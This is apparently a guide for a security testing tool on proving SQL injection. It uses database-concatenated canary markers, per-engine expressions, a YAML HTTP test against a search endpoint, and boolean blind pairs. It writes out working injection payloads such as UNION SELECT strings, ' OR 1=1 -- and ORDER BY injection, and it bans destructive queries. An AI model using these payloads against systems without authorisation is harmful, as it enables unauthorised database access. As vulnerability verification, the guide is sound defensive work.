# sqli: proving SQL injection

## What proves it
The database evaluates SQL the attacker wrote. The strongest proof is a value the **database
builds** from pieces in the payload and returns in the response: it cannot appear by echoing the
request, and it cannot appear on parameterised code (where the payload is just a string).

## Setup
- Use the same database engine as production (catalog `postgres` / `mysql`, or sqlite only if
  production is sqlite): concatenation, comments and quoting differ.
- Log in as the attacker the hypothesis names; seed at least one row the query can return.
- Read the vulnerable query to count its columns and their order, and see which column the
  response shows.

## Payload: marker assembled by the database
Split a marker in the payload and let SQL join it. The response contains `prsec<token>` only if
the concatenation ran.

| Engine | Expression |
|---|---|
| sqlite, Postgres, Oracle | `'prs' \|\| 'ec${CANARY.token}'` |
| MySQL / MariaDB | `CONCAT('prs', 'ec${CANARY.token}')` |
| SQL Server | `'prs' + 'ec${CANARY.token}'` |

Put it in a `UNION SELECT` with the right column count (pad with `1`/`NULL`), in a string
context close the quote first and end with a comment (`-- ` with a trailing space, or `#` on
MySQL). In a numeric context (`WHERE id = {x}`) no quote is needed.

```yaml
kind: http
hypothesis_id: H1
description: >
  The q parameter of GET /api/orders/search is interpolated into a LIKE clause. A UNION SELECT
  makes sqlite concatenate a canary marker that only exists if the injected SQL ran.
users:
  alice:
    vars: {username: alice, password: alice-dev-pw}
    login:
      - name: alice_login
        method: POST
        path: /api/login
        json: {username: "${USER.username}", password: "${USER.password}"}
        expect_status: [200]
steps:
  - name: inject
    as: alice
    path: /api/orders/search
    query:
      q: "zz' UNION SELECT 1, 'prs' || 'ec${CANARY.token}', 0 -- "
oracles:
  - type: response_status
    step: inject
    status: [200]
  - type: response_contains
    step: inject
    value: prsec${CANARY.token}
```

## No output channel (blind)
Use a **boolean pair** on a row with a distinctive seeded marker the caller should not see:
step `cond_true` appends `' OR 1=1 -- ` and must contain the marker; step `cond_false` appends
`' AND 1=0 -- ` and must not (`negate: true`). Never use a status 500 or a slow response as the
only evidence: errors and latency happen on safe code too.

## Pitfalls
- The app reflecting `q` in the response (`{"query": "..."}`) makes an unsplit marker fire on
  safe code. Always split it.
- ORMs that quote identifiers but interpolate `ORDER BY` / column names: inject into the
  identifier position (`sort=(SELECT 'prs' || 'ec${CANARY.token}')` is often invalid); prefer a
  boolean pair with `CASE WHEN 1=1 THEN id ELSE note END`.
- Never `DROP`, `DELETE`, `UPDATE` or stacked queries that change data.
